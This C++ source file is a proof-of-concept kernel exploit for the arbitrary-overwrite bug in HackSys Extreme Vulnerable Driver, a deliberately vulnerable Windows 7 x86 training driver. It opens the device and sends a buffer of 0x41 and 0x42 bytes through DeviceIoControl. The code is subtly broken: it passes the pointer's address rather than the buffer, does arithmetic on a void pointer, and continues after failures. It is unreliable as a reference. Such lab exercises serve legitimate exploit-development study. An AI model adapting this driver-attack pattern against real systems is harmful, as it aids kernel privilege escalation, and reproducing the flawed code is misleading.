#include <windows.h>
#include <iostream>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL 0x22200b

int main(){
    std::cout << "[+] HEVD - Arbitrary overwrite Windows 7 x86 exploit POC\n\n";

    HANDLE hDevice = CreateFileA(DEVICE_NAME,
                                 GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL,
                                 OPEN_EXISTING,
                                 FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
                                 NULL);

    if (hDevice == INVALID_HANDLE_VALUE){
        std::cout << "[!] Failed to establish a device handler" << GetLastError() << std::endl;
    } else {
        std::cout << "[+] Established a handle to the device - " << DEVICE_NAME << std::endl;
    }

    std::cout << "[+] Preparing the buffer payload\n";

    DWORD InBufferSize = 0x64;
    LPVOID inputBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, InBufferSize);

    if(!inputBuffer){
        std::cout << "[!] Failed to allocate buffer memory\n";
    } else {
        std::cout << "[+] Input buffer memory successfully allocated\n";
    }

    RtlFillMemory((PVOID)inputBuffer, 0x4, 0x41);
    RtlFillMemory((PVOID)(inputBuffer + 1), 0x4, 0x42);

    std::cout << "[+] Filled input buffer\n";

    DWORD sizeReturn = 0;
    BOOL deviceCom = DeviceIoControl(hDevice,
                    IOCTL,
                    &inputBuffer,
                    InBufferSize,
                    NULL,
                    0,
                    &sizeReturn,
                    NULL);

    HeapFree(GetProcessHeap(), 0, LPVOID(inputBuffer));
    CloseHandle(hDevice);


    return 0;
}
